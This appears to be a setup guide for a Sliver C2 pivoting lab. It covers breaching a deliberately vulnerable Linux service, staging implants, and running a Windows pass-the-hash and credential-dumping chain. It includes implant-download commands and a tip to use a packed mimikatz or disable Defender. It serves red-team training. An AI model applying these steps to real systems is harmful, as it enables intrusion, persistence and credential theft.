# Option B Lab — Setup Guide

One VirtualBox hypervisor, three VMs, one pivoting topology. No cross-hypervisor
routing, no WSL2. Kali (VMware) is optional and only used as an operator
workstation if you want it.

```
c2           192.168.56.5    Sliver + scenario-server   (attacker/orchestrator)
linux_pivot  192.168.56.10   Ubuntu, dual-homed         (clean — no pre-installed implant)
             172.16.1.10     ── isolated "sliver-lab" intnet ──┐
win_target   172.16.1.20     Windows 10                  (hidden target)
```

**win_target has NO route to the C2.** That is intentional — it is what makes
this a pivoting lab. You reach it *through* linux_pivot.

**linux_pivot ships with NO pre-installed implant.** `lab/provision/victim-linux.sh`
only installs OS dependencies now — it does not fetch or start a beacon. The only
way to get a session on linux_pivot is to actually breach it: `setup.sh` deploys a
deliberately-vulnerable `vulnweb` service on it (`:9090`, command injection in
`GET /ping?host=`), and `examples/full-attack-chain-v2.yaml` opens with an
`initial_access` step that exploits it to stage the beacon. See "Getting the first
Linux session (initial access)" below.

---

## What this package changes vs. the upstream repo

| File | Change |
|---|---|
| `Vagrantfile` | Replaced — adds a `c2` VM, wires provisioning, C2 at `.5` |
| `api/implant_windows.go` | **New** — `GET /api/v1/implant/windows` handler |
| `api/server.go` | One line added (see `api/ROUTE_PATCH.md`) |
| `examples/windows-pth-chain.yaml` | **New** — runnable Windows PtH chain |

The existing `lab/provision/c2-server.sh`, `victim-linux.sh` already work as-is
via env vars — no edits needed.

---

## Prerequisites (on your Windows host)

- VirtualBox 7.0+
- Vagrant 2.4.1+
- Go 1.22+ (to build the binaries before `vagrant up c2`)
- The `gusztavvargadr/windows-10` box (Vagrant pulls it automatically) **or**
  your own `win10_custom.box` (`vagrant box add win10_custom win10_custom.box`
  and change the box name in the Vagrantfile's `win_target` block).
- ~11 GB free RAM for the three guests.

> Hyper-V note: if WSL2/Hyper-V is enabled, VirtualBox runs slower via the
> Windows Hypervisor Platform. It still works; Windows boots just take longer.

---

## Step 1 — Drop the files into the repo

From your clone of `sliver-orchestrator/`:

```bash
cp Vagrantfile                     /path/to/sliver-orchestrator/
cp api/implant_windows.go          /path/to/sliver-orchestrator/api/
cp examples/windows-pth-chain.yaml /path/to/sliver-orchestrator/examples/
```

Then apply the one-line route change in `api/ROUTE_PATCH.md` to
`api/server.go`.

## Step 2 — Pull atomics + build the binaries

The C2 VM copies prebuilt binaries and atomics out of the synced repo, so build
them on the host first:

```bash
cd /path/to/sliver-orchestrator
git submodule update --init --remote     # 352 atomic techniques
make scenario-server                     # builds ./scenario-server (needs CGO)
make scenario-runner                     # optional, for CLI chain runs
```

If `make scenario-server` fails on CGO/sqlite, install a C toolchain:
`sudo apt install build-essential libsqlite3-dev` (Linux host) or use the
Docker build for the binary only.

## Step 3 — Bring up the C2 first

```bash
vagrant up c2
```

Watch it finish, then verify from the host (host is on 192.168.56.1):

```bash
curl http://192.168.56.5:8080/api/v1/health
```

You should get a health JSON. If not, `vagrant ssh c2 -c "journalctl -u scenario-server -n 50"`.

## Step 4 — Bring up linux_pivot (clean — no implant yet, by design)

```bash
vagrant up linux_pivot
```

linux_pivot only installs OS dependencies (curl, python3, nmap, arp-scan) — it
does NOT fetch or start a beacon anymore. Confirm it's clean:

```bash
curl http://192.168.56.5:8080/api/v1/sessions | jq .
```

You should see zero sessions. That's expected — see "Getting the first Linux
session (initial access)" below for how to actually obtain one.

## Step 5 — Bring up win_target (no implant yet — by design)

```bash
vagrant up win_target
```

It boots but does NOT call back — it can't reach the C2. That's expected.

---

## Getting the first Linux session (initial access)

Run `./setup.sh` (or its Step 6 alone) to deploy the lab's services onto
linux_pivot: the cosmetic honeypot on `:8080`, and — the actually-exploitable
target — `vulnweb` on `:9090`, a deliberately-vulnerable app with an OS
command-injection sink at `GET /ping?host=`. `lab/provision/c2-server.sh` also
stages `lab/exploits/web_rce.py` on the c2 VM at `/opt/exploits/web_rce.py`.

With that in place, breach linux_pivot with the chain instead of assuming a
session already exists:

```bash
./examples/run.sh examples/full-attack-chain-v2.yaml http://192.168.56.5:8080/api/v1
```

The chain's first step (`breach_linux_host`, `type: initial_access`) exploits
`vulnweb` to make linux_pivot download and run a Sliver implant served by the
scenario API, waits for the resulting session, and binds it to
`{{linux_session}}`. Every following step (discovery, cron/systemd persistence,
Windows host discovery, wmiexec lateral movement, SAM/VSS credential access)
runs with `session_id: "{{linux_session}}"` against that freshly-obtained
session — nothing about them changed, only how the first foothold is obtained.

---

## Deploying the Windows implant (the pivot part)

Because win_target is isolated, you push the implant through linux_pivot.

1. **Get an interactive session on the pivot** (Sliver client, using the
   operator config copied to `/home/vagrant/.sliver-scenario.cfg` on the c2 VM,
   or run `sliver` on the c2 VM itself).

2. **Start a pivot** from the pivot session so the C2's HTTP listener is
   reachable from the 172.16.1.0/24 side. Options:
   - Sliver `pivots` (named pipe / TCP pivot) — cleanest, keeps one C2.
   - Or a SOCKS5 proxy: `socks5 start` on the pivot session, then use
     proxychains from the pivot to drop the file.

3. **Fetch the Windows implant** (from the operator/pivot side):

   ```bash
   curl "http://192.168.56.5:8080/api/v1/implant/windows?c2=192.168.56.5" \
     -o sliver-win.exe
   ```

   First Windows build takes 2–3 min (cross-compile toolchain).

4. **Drop + run it on win_target through the pivot** (upload over the pivot
   session, or via `vagrant winrm`/shared folder for a quick test). When it
   runs, a Windows session appears in `GET /api/v1/sessions`.

> For a first smoke test you can skip the pivot and drop the .exe via
> `vagrant powershell win_target` / shared folder — but then you're not
> demonstrating pivoting, just implant execution. Use the pivot path for the
> real demo.

---

## Running the Windows PtH chain

Once a **Windows** session is checked in:

```bash
API=http://192.168.56.5:8080/api/v1
SESSION=$(curl -s $API/sessions | jq -r '.[] | select(.os=="windows") | .id' | head -1)

CHAIN_ID=$(curl -s -X POST $API/chains \
  -H 'Content-Type: application/yaml' \
  --data-binary @examples/windows-pth-chain.yaml | jq -r .id)

# validate the DAG first (no execution)
curl -s -X POST $API/chains/$CHAIN_ID/execute \
  -H 'Content-Type: application/json' \
  -d "{\"session_id\":\"$SESSION\",\"dry_run\":true}" | jq .

# execute + stream
EXEC_ID=$(curl -s -X POST $API/chains/$CHAIN_ID/execute \
  -H 'Content-Type: application/json' \
  -d "{\"session_id\":\"$SESSION\"}" | jq -r .execution_id)

curl -N $API/executions/$EXEC_ID/stream
```

### Before this chain actually recovers creds

The `parse_creds` step downloads `http://192.168.56.5:8888/samparse.exe` — a
**placeholder**. You must host a real offline SAM/creds parser there (e.g. a
static `secretsdump`/`pypykatz` build). Raw `mimikatz.exe` will be deleted by
Defender; use a packed build or disable Defender on the lab target. Until you
provide a parser that prints `NTLM: <32hex>` and `Username: <name>`, the
`pass_the_hash` step's condition won't fire (it gates on a captured hash) — the
chain will run cleanly but stop before PtH.

---

## Common failures

| Symptom | Cause / fix |
|---|---|
| `vagrant up c2` provision error on `make` outputs missing | You skipped Step 2; build binaries on the host first |
| linux_pivot never checks in | C2 not up yet, or firewall on c2 VM; check `curl .5:8080/api/v1/health` |
| Windows build times out | First cross-compile is slow; raise the client timeout, retry |
| win_target checks in directly | You left `victim-windows.ps1` provisioning enabled or gave it a `192.168.56.x` NIC — remove it; that breaks the pivot story |
| WinRM connection drops on `vagrant up win_target` | Normal for Win10 box first boot; the retry_limit/retry_delay handle it, give it 2–3 min |
